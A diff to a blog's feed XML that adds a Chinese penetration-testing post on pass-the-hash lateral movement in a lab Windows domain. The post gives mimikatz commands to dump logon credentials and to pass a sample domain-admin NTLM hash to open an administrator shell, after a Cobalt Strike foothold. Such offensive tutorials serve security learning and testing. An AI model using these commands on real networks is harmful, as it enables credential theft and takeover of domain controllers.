@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>使用PTH进行横向</title>
+      <link href="/2022/11/02/pth/"/>
+      <url>/2022/11/02/pth/</url>
+      
+        <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3><p>假设咱们抓出来的域管 NTLM 哈希解不开，这时候可以利用 mimikatz 尝试 PTH 攻击</p><p><code>pass-the-hash</code>在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过<code>LM Hash</code>和<code>NTLM Hash</code>访问远程主机或服务，而不用提供明文密码。</p><p>微软也对<code>pth</code>打过补丁，然而在测试中发现，在打了补丁后，常规的<code>Pass The Hash</code>已经无法成功，唯独默认的<code>Administrator(SID 500)</code>账号例外，利用这个账号仍可以进行<code>Pass The Hash</code>远程ipc连接。</p><h3 id="0x01-环境">0x01 环境</h3><p>普通域成员机器：10.1.10.7，操作系统win7</p><p>域控：10.1.10.8，操作系统win2008</p><h3 id="0x02-条件">0x02 条件</h3><p>域内任意一台主机的本地管理员权限和域管理员密码的 NTLM hash 值</p><h3 id="0x02-使用mimikatz进行攻击">0x02 使用mimikatz进行攻击</h3><p>首先使用<code>mimikatz</code>抓取域管hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log privilege::debug sekurlsa::logonpasswords exit</span><br></pre></td></tr></table></figure><img src="/2022/11/02/pth/image-20221102162947706.png" alt="image-20221102162947706" style="zoom:50%;"><p>win7上线cs，在cs上操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::pth /user:administrator /domain:fzm.cn /ntlm:abce628a814a052c482797c7422e5c99&quot; exit</span><br></pre></td></tr></table></figure><img src="/2022/11/02/pth/image-20221102174511457.png" alt="image-20221102174511457" style="zoom:50%;"><p>win7域成员机器，会自动弹出cmd.exe，是域管权限，执行命令即可。</p><img src="/2022/11/02/pth/image-20221102174206903.png" alt="image-20221102174206903" style="zoom:50%;">]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PTH </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>使用kekeo进行横向</title>
       <link href="/2022/11/02/kekeoptt/"/>
       <url>/2022/11/02/kekeoptt/</url>
@@ -22,9 +47,9 @@
             
             <tag> PTT </tag>
             
-            <tag> 横向移动 </tag>
-            
             <tag> kekeo </tag>
+            
+            <tag> 横向移动 </tag>
             
         </tags>
       
